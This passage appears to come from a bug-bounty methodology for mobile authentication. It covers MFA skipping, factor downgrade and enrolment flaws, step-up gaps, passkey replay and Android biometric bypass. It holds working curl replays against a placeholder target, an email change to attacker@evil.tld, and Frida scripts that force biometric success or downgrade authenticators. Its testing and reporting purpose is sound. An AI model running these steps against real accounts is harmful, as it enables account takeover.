- **Escalation:** Converts "I stole one credential" into "I logged in" → `hunt-ato`.
- **Ruled out when:** Every enumerated path either presents the challenge **and** refuses the post-MFA endpoint until it is satisfied, or issues a token whose scope demonstrably excludes post-MFA capability. Enumerate exhaustively — the value of this item is coverage, and a partial inventory is a false negative.

### D13-065 · Pre-MFA session carries post-MFA capability

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | Multi-step auth flows |
| **Maps to** | `hunt-mfa-bypass` "MFA-step skip via direct post-login navigation" |

- **Test:** Pre-MFA and post-MFA sessions frequently share the same cookie or token name; the flag that distinguishes them is sometimes never checked. Complete the password step but **not** the OTP step, then use the token everywhere.
- **How:**
```bash
PRE=$(curl -s -X POST https://api.target/v1/login -H 'Content-Type: application/json' \
      -d '{"email":"'"$U"'","password":"'"$P"'"}' | jq -r '.token // .access_token')
for ep in /api/account /api/transactions /api/cards /api/me /dashboard; do
  printf '%-18s ' "$ep"
  curl -s -o /dev/null -w '[%{http_code}]\n' "https://api.target$ep" -H "Authorization: Bearer $PRE"
done
# also decode it: does the pre-MFA token differ from the post-MFA one at all?
echo "$PRE" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq '{amr, acr, mfa, scope, auth_time}'
```
- **Proof:** Data only a fully-authenticated user should see, returned to the pre-MFA token, body-diffed against the unauthenticated baseline. The decoded claim set showing an identical token with no `amr`/`acr`/`mfa` discriminator is the mechanism.
- **Escalation:** → full ATO given a leaked password → D15.
- **Ruled out when:** The pre-MFA token is a distinct short-lived artefact (different name, different claim set, or an explicit `mfa_pending` flag) and every protected endpoint refuses it. Check the claim set as well as the status codes: a token that *carries* the discriminator but whose resource servers never read it is the same bug with a better disguise.

### D13-066 · MFA channel downgrade to the weakest configured factor

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.two_fa_bypass` (P3); `authentication_bypass` (P1) with the issued session |
| **Attacker** | AM-01 |
| **Applies to** | Accounts offering more than one second factor |
| **Maps to** | `hunt-mfa-bypass` pattern library (H1 #665722, $2,500 — an "email" MFA mode allowing bypass) |

- **Test:** An account offering TOTP *and* SMS/email OTP is only as strong as the weaker path, which frequently lives on a separate endpoint with separate (weaker) throttling and separate replay handling.
- **How:** Map every MFA and recovery option the account exposes, then attack each one's verify endpoint independently — and, mid-flow, try to satisfy a TOTP challenge through the SMS path.
```bash
curl -s https://api.target/v1/mfa/methods -H "Authorization: Bearer $PRE_MFA" | jq .
curl -s -X POST https://api.target/v1/mfa/sms/send -H "Authorization: Bearer $PRE_MFA" -i
# then run D13-038's throttle measurement against /v1/mfa/sms/verify, not just /v1/mfa/totp/verify
```
- **Proof:** The weak path issuing a post-MFA session, with a throttle threshold measurably lower than the strong path's.
- **Escalation:** → ATO. Frame it as weakest-link MFA: the strong factor the vendor advertises is irrelevant while a weaker one is selectable.
- **Ruled out when:** Every configured factor's verify endpoint enforces the same throttle, the same single-use semantics and the same binding, and a challenge issued for one factor cannot be satisfied by another. Enumerate the factor list from the API, not from the UI — the UI hides options the API still accepts.

### D13-067 · 2FA enrolment without the current factor, and factor binding before identity verification

| | |
|---|---|
| **Severity ceiling** | High–Critical |
| **VRT** | `server_security_misconfiguration.lack_of_password_confirmation.manage_two_fa` (P5) for the bare absence; `broken_authentication_and_session_management.two_fa_bypass` (P3); `authentication_bypass` (P1) with the resulting takeover |
| **Attacker** | AM-01, AM-02 (the CSRF variant) |
| **Applies to** | All |
| **Maps to** | H1 #155774 (Slack, $500), #667740 (Grammarly, "Can register any mobile number in MFA without current code"), #2762462 (MTN, Critical 9.1), #649533 (adding 2FA without verifying email first), #2588329 (OTP flaw allowing binding of any phone number) |

- **Test:** Two related failures. (a) A second phone number or authenticator can be attached without proving control of the **existing** factor or re-entering the password. (b) During signup, a factor can be bound before the email/phone verification step completes — which makes MFA an ATO *primitive* rather than a defence.
- **How:**
```http
POST /account/settings/2fa_sms HTTP/1.1
Cookie: <victim session>

verify_two_factor=1&backup=&app=&country_code=AU&phone_number=<ATTACKER>
```
Replay it without the CSRF token and from a second session. The disclosed Slack chain went further: the page auto-submitted the enrolment, called back to the attacker's server for the SMS code the attacker had just received, then auto-submitted the verification.
```bash
# enrolment-before-verification variant
curl -s -X POST https://api.target/v1/mfa/enroll -H "Authorization: Bearer $UNVERIFIED_SIGNUP_TOKEN" \
  -H 'Content-Type: application/json' -d '{"type":"sms","phone":"<ATTACKER>"}' -i
```
- **Proof:** The attacker's number listed as a valid 2FA destination on the victim's account, then a login where the code is delivered to the attacker. For (b), a factor bound to an account whose primary identifier you never proved control of.
- **Escalation:** → full ATO; → D13-060 (pre-account takeover, which this enables) — and remember that bare pre-ATO is never-submit, so demonstrate the completed claim.
- **Ruled out when:** Enrolment requires the current factor's code or the account password, is bound to the initiating session, and cannot complete before the primary identifier is verified. Test all three; implementations commonly require the password but not the current factor, which still leaves the stolen-session path open.

### D13-068 · MFA disable or TOTP-secret regeneration without step-up; secret still obtainable after enrolment

| | |
|---|---|
| **Severity ceiling** | High–Critical |
| **VRT** | `insufficient_security_configurability.weak_two_fa_implementation.two_fa_secret_remains_obtainable_after_two_fa_is_enabled` (P4); `.two_fa_secret_cannot_be_rotated` (P4); `server_security_misconfiguration.lack_of_password_confirmation.manage_two_fa` (P5); `two_fa_bypass` (P3) with the bypass |
| **Attacker** | AM-01, AM-11 |
| **Applies to** | Account-settings APIs |
| **Maps to** | `hunt-mfa-bypass` "MFA-disable / TOTP-regen without re-auth" |

- **Test:** A "disable 2FA" toggle or "regenerate TOTP secret" action that does not require the current OTP or the password turns a stolen session into permanent MFA hijack. Separately, after enrolling TOTP, call the enrolment/secret endpoint again from the mobile API and see whether it returns the seed.
- **How:**
```bash
# disable / regenerate with no step-up, from a session that never presented a factor
curl -s -X POST https://api.target/v1/mfa/disable -H "Authorization: Bearer $T" -i
curl -s -X POST https://api.target/v1/mfa/totp/regenerate -H "Authorization: Bearer $T" -i
# secret still obtainable after enrolment?
curl -s https://api.target/v1/2fa/setup -H "Authorization: Bearer $T" \
  | grep -oiE '"(secret|otpauth_url|qr)"\s*:\s*"[^"]+' 
# then compute a code from the returned seed and validate it
oathtool --totp -b "$SEED"
```
- **Proof:** MFA state mutated with no step-up, and subsequent logins either skipping the challenge or accepting the attacker-controlled secret. For the re-read variant: the base32 seed returned to an already-enrolled session, plus a generated code that validates.
- **Escalation:** → persistent ATO. Combine with D13-057 (recovery codes) — an account whose seed, recovery codes and disable toggle are all reachable from a bare session has no second factor at all.
- **Ruled out when:** Disable and regenerate both require a fresh factor proof (not merely the password), and the setup endpoint returns the seed exactly once at enrolment and 403s afterwards. Also confirm the secret *can* be rotated — an unrotatable secret is its own P4 node.

### D13-069 · "Remember this device" trust token unbound to anything

| | |
|---|---|
| **Severity ceiling** | Medium–High (real impact when chained with a password leak) |
| **VRT** | `broken_authentication_and_session_management.two_fa_bypass` (P3) |
| **Attacker** | AM-01 |
| **Applies to** | Apps offering device trust |
| **Maps to** | `hunt-mfa-bypass` "Remember this device cookie — IP/UA unbound" |

- **Test:** A 30-day trust cookie that is a bare bearer of "MFA already done". Complete MFA on device A, capture the artefact, and present it from a different IP and User-Agent.
- **How:**
```bash
grep -rniE 'remember_device|trust_token|trusted_device|device_token|skip_mfa|rememberMe' jadx_out/sources
adb shell run-as com.target.app grep -rl 'trust\|remember' shared_prefs/ databases/ files/
# present it from elsewhere
curl -s -X POST https://api.target/v1/login -H 'Content-Type: application/json' \
  -H 'User-Agent: curl/8.4.0' -b "trust_token=$TT" \
  -d '{"email":"'"$U"'","password":"'"$P"'"}' -i | head -20
```
- **Proof:** A login from a new IP and a different User-Agent skipping the MFA challenge entirely, with the trust artefact as the only carried state.
- **Escalation:** + credential stuffing (D13-013) or a password leak → ATO. Also check whether the trust list is visible and revocable in the account UI — if it is not, this becomes the D13-022 invisible-session problem.
- **Ruled out when:** The trust artefact is cryptographically bound (a device key, a DPoP-style proof, or a server-side record keyed to a device id the client cannot choose) and is refused from a different network and agent, **and** the trust list is enumerable and revocable by the user. A trust token that merely *contains* a device id is not bound — you can set that too.

### D13-070 · The step-up matrix for sensitive actions on an unlocked device

| | |
|---|---|
| **Severity ceiling** | Critical (payee-add plus limit-raise on a payments app); High for any row that leads to takeover; Medium for disclosure-only rows |
| **VRT** | `server_security_misconfiguration.lack_of_password_confirmation.change_email_address` (P5), `.change_password` (P5), `.manage_two_fa` (P5), `.delete_account` (P4) for the bare absences; `broken_authentication_and_session_management.authentication_bypass` (P1) for the takeover chain |
| **Attacker** | AM-11 (borrowed/unattended unlocked phone), AM-01 (with a stolen token) |
| **Applies to** | All apps with an account |
| **Maps to** | MASWE-0023 (Step-Up Authentication Not Implemented for Sensitive Actions, CWE-306 — modes: no re-authentication, step-up not bound to the action, **step-up not enforced server-side**, uniform assurance level); MASVS-AUTH-3. *No Android MASTG-TEST covers step-up — a MASTG gap; this is pure API testing.* |

- **Test:** On a borrowed or briefly-unattended unlocked phone, can the attacker perform the actions that convert temporary access into permanent account control? Walk **every** row, logged in, with no fresh authentication — then repeat the whole matrix through a stolen session token, because the rows that require a password in the UI but not at the API are the best findings.
```
[ ] change account email            [ ] change / add phone number
[ ] change password (old pw asked?) [ ] disable or re-enrol 2FA / change 2FA method
[ ] view full card / bank / IBAN    [ ] add payee / beneficiary / withdrawal address
[ ] add a "trusted device"/session  [ ] revoke other sessions (and does it revoke yours?)
[ ] export / download my data       [ ] change security questions / recovery email
[ ] change delivery address         [ ] raise transfer / spend limits
[ ] view recovery codes / seed / QR [ ] deactivate / delete account
```
- **How:**
```bash
# does the endpoint require a fresh-auth proof at all?
grep -RniE 'current_password|otp|mfa_token|reauth|acr|auth_time|step_up|x-step-up' burp-export.json
# strip the proof and replay
curl -i -X POST https://api.target/v1/account/email -H "Authorization: Bearer $TOK" \
     -H 'Content-Type: application/json' -d '{"email":"attacker@evil.tld"}'
# then the binding tests: reuse ONE step-up token on a DIFFERENT sensitive action,
# and reuse it after modifying the original transaction's parameters
curl -i -X POST https://api.target/v1/payees -H "Authorization: Bearer $TOK" \
     -H "X-Step-Up: $STEPUP_FROM_EMAIL_CHANGE" -d '{"iban":"..."}'
```
- **Proof:** A filled checklist with an HTTP status per row, plus for each passing row either a screen recording showing no prompt or a 200 on the replayed request with the fresh-auth field removed. For the binding half: the server executing a sensitive action when the step-up evidence is reused across a different action, or reused after the transaction's parameters changed.
- **Escalation:** Each passing row is a standalone finding; email **plus** 2FA together is a persistent-ATO chain — file per D13-009. Change the recovery email without step-up → permanent account takeover.
- **Ruled out when:** Every row demands a fresh proof that the server validates, the proof is single-use, and it is bound to the specific action and its parameters. The three failure modes are independent: no re-authentication at all; step-up present but not bound; step-up present in the UI but not enforced server-side. Test all three per row — the third is the one the UI conceals.

### D13-071 · Email or phone change without re-auth and without notifying the old identifier

| | |
|---|---|
| **Severity ceiling** | Critical when chained to reset (full ATO from a stolen session token); High standalone |
| **VRT** | `server_security_misconfiguration.lack_of_password_confirmation.change_email_address` (P5) standalone; `broken_authentication_and_session_management.authentication_bypass` (P1) with the reset chain |
| **Attacker** | AM-01, AM-11 |
| **Applies to** | All |
| **Maps to** | ATT&CK T1640 Account Access Removal ("Accounts may be deleted, locked, or manipulated (ex: credentials changed) to remove access"; Monokle "reset the user's password/PIN"), T1629.002 Device Lockout; `hunt-business-logic` "Email change without re-auth"; H1 #207552 (Khan Academy, Medium — password change with no current-password check) |

- **Test:** The change-of-identifier flow is the shortest path to persistent ATO and is almost always weaker in the app than on the web. Four properties: does it require the current password or a step-up; is the confirmation token bound to the initiating session; is the **old** address/number notified; does the change invalidate other sessions?
- **How:**
```bash
# 1. session token only, no password field at all
curl -s -X PATCH https://api.target/v1/me -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{"email":"attacker@evil.tld"}' -i
# 2. password field present but blank / wrong / omitted
# 3. initiate on device A, confirm the emailed/SMS token from device B with a different session
# 4. after a successful change, replay an old device's token
# 5. the API path often bypasses the UI's own audit log — check whether any notification fires at all
```
- **Proof:** 200 and `GET /me` returning the new identifier, with no password prompt in the app UI and **no mail/SMS to the previous address** — the absent notification is the evidence, so screenshot both mailboxes. Then run the password reset to the new address and complete the takeover.
- **Escalation:** This is the terminal step for every stolen-token primitive in the corpus — cite it as the impact for cleartext-token, deep-link-token-theft and clipboard-token findings. If the app also holds device admin (D03), the same primitive can lock the physical device via `DevicePolicyManager.lockNow()`, which is the Critical variant.
- **Ruled out when:** The change requires a step-up the server validates, the confirmation token is bound to the initiating session, the **old** identifier receives an out-of-band notification, and sibling sessions are invalidated. All four; the notification is the one most often missing and the easiest to evidence.

### D13-072 · WebAuthn / passkey assertion replay across sessions

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | WebAuthn / passkey deployments and apps using Credential Manager |
| **Maps to** | `hunt-mfa-bypass` "WebAuthn challenge replay"; `developer.android.com/identity/sign-in/credential-manager`, `training/sign-in/passkeys` (`GetPublicKeyCredentialOption`, `CreatePublicKeyCredentialRequest`, `requestJson` `challenge` and `rpId`); Digital Asset Links relation `delegate_permission/common.get_login_creds` |

- **Test:** If the server does not bind the challenge to the session or track challenge uniqueness, the strongest commonly-deployed factor is replayable. Two further questions specific to Android: is the `challenge` server-generated and single-use, and is `rpId` fixed server-side or taken from a client-supplied value?
- **How:**
```bash
grep -rn 'CredentialManager\|GetCredentialRequest\|GetPublicKeyCredentialOption\|CreatePublicKeyCredentialRequest\|PasswordOption\|requestJson' jadx_out/sources
# the credential-sharing association is a DIFFERENT relation from link handling — check the right one
curl -s https://target.example/.well-known/assetlinks.json \
  | jq '.[] | select(.relation[] | contains("get_login_creds"))'
apksigner verify --print-certs base.apk | grep -i 'SHA-256'      # must match the assetlinks fingerprint
# then proxy the registration/assertion and replay
curl -s -X POST https://api.target/v1/webauthn/verify -H "Cookie: session=$SECOND_SESSION" \
  -H 'Content-Type: application/json' --data @assertion_from_first_session.json -i
```
- **Proof:** The same assertion accepted in a second session, or the same `challenge` accepted twice — both requests captured in Burp. For the origin half: an `assetlinks.json` whose `sha256_cert_fingerprints` does not match the production signing certificate, or a `get_login_creds` delegation to a host the client does not control.
- **Escalation:** → ATO despite hardware-backed MFA. Combine with the WebView variant: a WebView that can be navigated to an attacker origin and still triggers `getCredential` for the app's RP id is a credential-phishing primitive (→ D10).
- **Ruled out when:** Each challenge is server-generated, single-use and session-bound (the replay returns a challenge-mismatch error), `rpId` is fixed server-side, and the `get_login_creds` statement lists only the production signing certificate. Do not conflate the two Digital Asset Links relations: `common.get_login_creds` governs credential sharing and `common.handle_all_urls` governs link handling — confusing them silently breaks one of them.

### D13-073 · Credential Manager legacy fallback, and Restore Credentials

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where the fallback issues a session the passkey path would have refused |
| **Attacker** | AM-03, AM-11 |
| **Applies to** | Apps mid-migration to Credential Manager — very common in current releases; and apps adopting Restore Credentials |
| **Maps to** | `developer.android.com/identity/sign-in/credential-manager` (migration guides from "Google Sign-In, Smart Lock, FIDO2"; "Integration with Restore Credentials API for seamless sign-in on new devices") |

- **Test:** Apps migrating to Credential Manager frequently keep the legacy path (Smart Lock, the FIDO2 API, Google Sign-In) as a fallback, and the fallback usually lacks the origin binding and phishing resistance of the passkey path. Separately, any flow that re-establishes an authenticated session on a *different* device without a fresh user-verification step is worth probing: what binds the restored credential to the user rather than to the backup?
- **How:**
```bash
grep -rn 'androidx.credentials\|CredentialManager' jadx_out/sources | head
grep -rn 'Fido2ApiClient\|CredentialsApi\|GoogleSignInClient\|SmartLock' jadx_out/sources
grep -rn -i 'restorecredential\|RestoreCredential\|restore_credential' jadx_out/sources
```
Force the fallback by making the Credential Manager call fail:
```js
Java.perform(function () {
  var CM = Java.use('androidx.credentials.CredentialManager');
  CM.getCredential.overloads.forEach(function (o) {
    o.implementation = function () { throw Java.use('java.lang.RuntimeException').$new('forced'); };
  });
});
```
Then perform a device-to-device restore into a second device/emulator and see whether the app lands authenticated.
- **Proof:** The legacy path completing a sign-in with a credential the passkey path would have refused (wrong origin, no user verification); or an authenticated session present on a freshly restored device with no biometric/PIN step.
- **Escalation:** → D02/D11 (backup extraction) → account takeover. The strongest authenticator the app ships is worth exactly what its weakest fallback is worth.
- **Ruled out when:** The Credential Manager failure produces an error state rather than a legacy sign-in, and a restored session requires fresh user verification before it becomes usable. Test the forced-failure path explicitly — the fallback is invisible on a device where the primary path works.

### D13-074 · Biometric gate with no `CryptoObject` — the boolean an attacker can force

| | |
|---|---|
| **Severity ceiling** | High (Critical when it gates a payment, a credential vault or a "view stored card" screen) |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) if it yields the session; **demotion trap:** a bypass needing root/Frida with no other weakness lands at `lack_of_binary_hardening.runtime_instrumentation_based` (**P5**) — always pair it with the missing `CryptoObject` |
| **Attacker** | AM-11, AM-03 (any in-process code-execution primitive) |
| **Applies to** | All. `androidx.biometric.BiometricPrompt` back-ports to **API 23**; `android.hardware.biometrics.BiometricPrompt` is **API 28+**; `FingerprintManager` is deprecated at API 28 and is where the callback-boolean pattern is most common — mark it **LEGACY** |
| **Maps to** | MASTG-TEST-0327 (References to APIs for Event-Bound Biometric Authentication), LEGACY-ID MASTG-TEST-0018 (deprecated), MASTG-TEST-0017 (Testing Confirm Credentials); MASWE-0020 (CWE-285, 287, 312, 319, 326, 602, 603, 863, 922); MASVS-AUTH-2; MASTG-KNOW-0001/0012/0043/0047, MASTG-BEST-0036; rule `mastg-android-biometric-event-bound`; mobsfscan `android_biometric_without_crypto` / `android_kotlin_biometric_without_crypto`; ATT&CK T1461, T1617; H1 #637194 (Shopify) |

- **Test:** The load-bearing distinction in this whole sub-domain. `authenticate(promptInfo)` yields a boolean delivered to `onAuthenticationSucceeded`; `authenticate(promptInfo, CryptoObject(cipher))` yields an object whose key only an authenticated user could unlock. If the app takes the **callback** as the authorisation and then reads a token from unprotected storage, the entire gate is a branch in app code. MASTG-TEST-0327 fails only when *both* conditions hold: `authenticate` lacks a `CryptoObject` **and** there are no calls to key generation with `setUserAuthenticationRequired(true)` in conjunction with biometric authentication.
- **How:**
```bash
semgrep -c rules/mastg-android-biometric-event-bound.yml jadx_out/sources/
grep -rnE 'biometricPrompt\.authenticate\(|BiometricPrompt\.CryptoObject|onAuthenticationSucceeded|result\.getCryptoObject|result\.cryptoObject|setUserAuthenticationRequired' jadx_out/sources/ -A4
grep -rn 'onAuthenticationSucceeded' jadx_out/sources/ -A25 | grep -n 'getCryptoObject'   # is it ever READ?
```
Confirm the argument count at runtime, then force the callback:
```js
Java.perform(function () {
  var BP = Java.use('androidx.biometric.BiometricPrompt');
  BP.authenticate.overloads.forEach(function (o) {
    o.implementation = function () {
      console.log('[authenticate] argc=' + arguments.length +
                  ' cryptoObject=' + (arguments.length > 1 ? arguments[1] : 'NONE'));
      return o.apply(this, arguments);
    };
  });
  var CB = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');
  CB.onAuthenticationSucceeded.implementation = function (r) {
    console.log('[+] forcing biometric success'); return this.onAuthenticationSucceeded(r);
  };
});
```
```bash
objection -g com.target.app explore
android hooking watch class_method androidx.biometric.BiometricPrompt.authenticate --dump-args
android keystore detail                     # D12: what key was the prompt supposed to unlock?
```
- **Proof:** `cryptoObject=NONE` in the log, the protected screen opening with **no system biometric dialog ever appearing**, and the underlying data rendering **legibly** (not ciphertext) — that silence plus that legibility is the evidence nothing cryptographic depended on the biometric. Screen-record it. The contrast case is what proves a correct implementation: a `CryptoObject`-backed gate fails with `KeyPermanentlyInvalidatedException` / `UserNotAuthenticatedException`, or renders encrypted garbage.
- **Escalation:** → whatever the gate protected: D11 (the released secret), D12 (the Keystore alias), D23 (payment authorisation), and D13-010 (does the released token work off-device?). Frame it for triage as "the authentication decision is not cryptographically bound, so any code-execution primitive in the process is an auth bypass" — **not** "root detection bypassed".
- **Ruled out when:** A `CryptoObject` is supplied, the callback actually reads `result.getCryptoObject()` and uses the resulting `Cipher`/`Mac`/`Signature` to unwrap the real secret, **and** the key was generated with `setUserAuthenticationRequired(true)` — under which the forced callback surfaces the UI but decryption still fails. Record that negative with the exception text; it is a passing control worth reporting. Two reporting cautions: demonstrate on a **physical** device (a Frida-on-emulator demo invites a "not a real-world bypass" rebuttal), and state the injection precondition honestly — Frida needs a rooted/debuggable environment or a Gadget-repackaged APK.

### D13-075 · `CryptoObject` present but the authorised cipher is never used

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) with the released secret |
| **Attacker** | AM-11, AM-03 |
| **Applies to** | All apps using `BiometricPrompt` / `FingerprintManager` with a crypto object |
| **Maps to** | HackTricks `bypass-biometric-authentication-android.md` Method 2 (WithSecure `fingerprint-bypass-via-exception-handling.js`); SEC Consult's three classes — (1) No Use of Crypto, (2) **Improper Use of Crypto**, (3) Data not Crucial for Authentication; mindedsecurity `MSTG-AUTH-8` rule (`pattern-not-inside` requiring `$CIP = $RES.getCryptoObject().getCipher();`) |

- **Test:** Class 2. Even with a `CryptoObject`, an app that does not use the *authorised* cipher for the protected data can be driven through `onAuthenticationSucceeded` with an unauthorised object. The Semgrep-shaped question is whether the success handler actually assigns from `result.getCryptoObject().getCipher()` and then uses that instance.
- **How:**
```bash
frida -U -f com.target.app --no-pause -l fingerprint-bypass-via-exception-handling.js
# reach the fingerprint screen so authenticate() is called, then in the Frida console:
> bypass()
```
The script prepares `onAuthenticationSucceeded` and handles `javax.crypto.IllegalBlockSizeException` in `Cipher`, so subsequent objects the app uses are encrypted with the new key.
```bash
# static confirmation of the class
grep -rn 'onAuthenticationSucceeded' jadx_out/sources/ -A25 \
  | grep -nE 'getCryptoObject\(\)\.getCipher\(\)|doFinal|unwrap|init\(Cipher\.'
```
- **Proof:** Console showing `Hooking BiometricPrompt.authenticate()... / Hooking FingerprintManager.authenticate()...`, `bypass()` returning, and the protected feature unlocking — with the decompiled success handler showing that the authorised cipher is obtained and discarded, or never obtained at all.
- **Escalation:** As D13-074. The correct fix to recommend is precise: reject a `CryptoObject` with a null or unexpected cipher/signature and treat it as a fatal authentication error.
- **Ruled out when:** The success handler assigns the cipher from the result and uses **that instance** to decrypt the protected material, so an unauthorised object throws rather than yielding plaintext. Distinguish SEC Consult's class 3 before writing: if the data behind the gate is not crucial for authentication and is separately protected, the bypass is Low-to-informational — that class exists precisely to stop over-claiming.

### D13-076 · Keys not invalidated on new biometric enrolment

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where it reaches account funds or a credential vault |
| **Attacker** | AM-11 (attacker holds the device and knows the passcode) |
| **Applies to** | `setInvalidatedByBiometricEnrollment` is **API 24+**; the default is `true` (secure) — any explicit `false` is the finding |
| **Maps to** | MASTG-TEST-0328 (References to APIs Detecting Biometric Enrollment Changes); MASWE-0022 (Crypto Keys Not Invalidated on New Biometric Enrollment, CWE-287, CWE-522); MASVS-AUTH-2, MASVS-CRYPTO-2; MASTG-KNOW-0001, MASTG-BEST-0037; rule `mastg-android-biometric-invalidated-enrollment`; Oversecured banking-ATO item 8 |

- **Test:** With `setInvalidatedByBiometricEnrollment(false)`, an attacker who obtains the device passcode can enrol **their own** fingerprint or face in Settings and then unlock the app's keys with it. This is the strongest biometric PoC in the chapter because it needs **no instrumentation at all**.
- **How:**
```bash
semgrep -c rules/mastg-android-biometric-invalidated-enrollment.yml jadx_out/sources/
grep -rn 'KeyGenParameterSpec.Builder' jadx_out/sources/ -A20 \
  | grep -nE 'setUserAuthenticationRequired|setInvalidatedByBiometricEnrollment|setUserAuthenticationParameters|setUserAuthenticationValidityDurationSeconds'
# practical PoC, unmodified device, app already logged in:
# Settings > Security > Fingerprint > Add a fingerprint, then reopen the app and authenticate with the NEW finger
```
- **Proof:** Authenticating into the app with a biometric enrolled **after** the app's key was created, on an unmodified retail device, and reaching the protected data — with no `KeyPermanentlyInvalidatedException`. Record both steps on video: the enrolment in Settings, then the unlock.
- **Escalation:** Full account access on a stolen, borrowed or serviced device. Pair with D13-077 (device-credential fallback): together they mean the biometric gate reduces to the device PIN.
- **Ruled out when:** The key is built with `setInvalidatedByBiometricEnrollment(true)` (or the flag is absent, so the secure default applies) and the app throws `KeyPermanentlyInvalidatedException` after a new enrolment, forcing re-authentication with the primary credential. Demonstrate the exception rather than inferring it from source.

### D13-077 · Device-credential fallback, weak-class biometrics, and authenticator downgrade

| | |
|---|---|
| **Severity ceiling** | Medium (High for finance/health/government verticals, or where the fallback is a second non-key-bound path) |
| **VRT** | rated on the protected action; the configuration alone is not a VRT node |
| **Attacker** | AM-11 |
| **Applies to** | `setAllowedAuthenticators` is **API 30+**; `setDeviceCredentialAllowed` is deprecated at API 30 — mark it **LEGACY**; the biometric class model dates from Android 10 |
| **Maps to** | MASTG-TEST-0326 (References to APIs Allowing Fallback to Non-Biometric Authentication); MASWE-0021 (CWE-287, CWE-288); MASVS-AUTH-2; MASTG-BEST-0031; rule `mastg-android-biometric-device-credential-fallback`; `source.android.com/docs/security/features/biometric` capability table; AOSP security-model paper §4.2.1 (Class 3: SAR < 7%; Class 2: 7% < SAR < 20%; Class 1: SAR > 20% or an insecure pipeline; all classes FAR ≤ 1/50000 and FRR < 10%; "Only Class 3 biometrics can unlock Keymint auth-bound keys and only Class 3 and 2 can be used for in-app authentication"); HackTricks Method 7 |

- **Test:** Three related weakenings. (a) `setAllowedAuthenticators(... | DEVICE_CREDENTIAL)` or `setDeviceCredentialAllowed(true)` lets the device PIN stand in for the biometric. (b) `BIOMETRIC_WEAK` (Class 2) **cannot unlock Keystore keys at all**, so an app accepting Class 2 for payment authorisation is by construction using D13-074's UI check. (c) The `DEVICE_CREDENTIAL` path may be implemented as a *second*, bare `createConfirmDeviceCredentialIntent()` + `onActivityResult(RESULT_OK)` branch — which reintroduces the callback bypass through the fallback.
- **How:**
```bash
semgrep -c rules/mastg-android-biometric-device-credential-fallback.yml jadx_out/sources/
grep -rnE 'setAllowedAuthenticators\(|BIOMETRIC_STRONG|BIOMETRIC_WEAK|BIOMETRIC_CONVENIENCE|DEVICE_CREDENTIAL|setDeviceCredentialAllowed|setNegativeButtonText' jadx_out/sources/
grep -rn -A10 'setAllowedAuthenticators' jadx_out/sources/ | grep -nE 'CryptoObject|createConfirmDeviceCredentialIntent'
adb shell dumpsys biometric | head -40
```
Force the downgrade to confirm it is not merely declared:
```js
var B = Java.use('androidx.biometric.BiometricPrompt$PromptInfo$Builder');
B.setAllowedAuthenticators.implementation = function (flags) {
  return this.setAllowedAuthenticators(0x00FF | 0x8000);   // BIOMETRIC_WEAK | DEVICE_CREDENTIAL
};
```
- **Proof:** The prompt offering the device-credential fallback (or accepting a weak biometric) on a flow the app declared strong-only, **and** the sensitive action completing. For (c): two distinct code paths, where hooking the `onActivityResult` branch yields the same access as the biometric branch.
- **Escalation:** Combine with a shoulder-surfed or known PIN plus D13-076 for a full chain; → D23 where it authorises payments.
- **Ruled out when:** The high-value path requests `BIOMETRIC_STRONG` only, the result is `CryptoObject`-bound, and the `DEVICE_CREDENTIAL` branch (where present) is itself `CryptoObject`-bound rather than a bare `RESULT_OK` check. Be precise about severity: MASTG itself says using `DEVICE_CREDENTIAL` "is not inherently a vulnerability… better categorized as a security weakness or hardening issue, not a critical vulnerability" — report it Low on most programs, Medium for finance/health/government, never Critical. Record the documented root cause too: mixing `DEVICE_CREDENTIAL` with a `CryptoObject` is unsupported, which is *why* many apps drop the CryptoObject.

### D13-078 · Passive confirmation and long key-validity windows

| | |
|---|---|
| **Severity ceiling** | Medium–High, scaled by the window length and the gated action |
| **VRT** | rated on the protected action |
| **Attacker** | AM-11 |
| **Applies to** | `setConfirmationRequired` default is `true`; `setUserAuthenticationParameters` is **API 30+**, `setUserAuthenticationValidityDurationSeconds` deprecated at API 30 — **LEGACY**; duration `0` is the secure per-operation configuration |
| **Maps to** | MASTG-TEST-0329 (References to APIs Enforcing Authentication without Explicit User Action), MASTG-TEST-0330 (Keys used in Biometric Authentication with Extended Validity Duration); MASWE-0020, MASWE-0016; MASVS-AUTH-2, MASVS-CRYPTO-2; MASTG-BEST-0038, MASTG-BEST-0036; rules `mastg-android-biometric-no-confirmation-required`, `mastg-android-biometric-validity-duration` |

- **Test:** Two configuration weakenings that compound. With `setConfirmationRequired(false)`, a passive biometric (face/iris) authenticates with **no explicit user action** — the user need not intend the action at all. With a validity duration `> 0`, one successful authentication authorises key use for that entire window.
- **How:**
```bash
semgrep -c rules/mastg-android-biometric-no-confirmation-required.yml jadx_out/sources/
semgrep -c rules/mastg-android-biometric-validity-duration.yml jadx_out/sources/
grep -rnE 'setConfirmationRequired\(|setUserAuthenticationParameters\(|setUserAuthenticationValidityDurationSeconds\(' jadx_out/sources/
```
PoC: authenticate once, then perform the protected operation **repeatedly** inside the configured window with no further prompt; and, for the confirmation half, complete the action on passive face recognition alone with no tap.
- **Proof:** A second and third privileged operation succeeding with no prompt, timed inside the window, with the configured duration quoted from the decompiled code; and a screen recording of the action completing on a passive match with no deliberate confirmation.
- **Escalation:** → D23 (repeated transactions on a single unlock). Pair the two: together they mean a passive biometric match can authorise a payment with no deliberate user action, and then authorise several more.
